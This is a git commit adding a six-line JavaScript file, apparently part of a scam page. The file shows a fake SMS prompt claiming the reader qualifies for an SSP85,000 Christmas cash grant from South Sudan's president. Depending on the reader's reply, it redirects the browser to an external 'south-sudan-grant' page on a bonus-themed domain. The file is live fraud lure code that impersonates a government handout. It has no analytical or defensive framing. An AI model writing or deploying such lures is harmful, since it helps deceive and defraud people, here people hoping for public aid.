0b8c3f3027e7578b5df56343da71cb6530f21b96
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-26 05:25:04 -0800

    Create sudan-active.js

---
+++ sudan-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW SSP85,000'
+password=prompt('SMS: Congratulations You are qualify for President SALVA KIIR MAYARDIT SSP85,000 CHRISTMAS AND NEW YEAR CASH GRANT FOR PEOPLE OF SOUTH SUDAN, Kindly Press OK to Withdraw X-Mas Cash Grant   ','WITHDRAW SSP85,000');
+if (password != 'WITHDRAW SSP85,000') {
+location.href='https://30gbbonus.xyz/south-sudan-grant.html';
+}
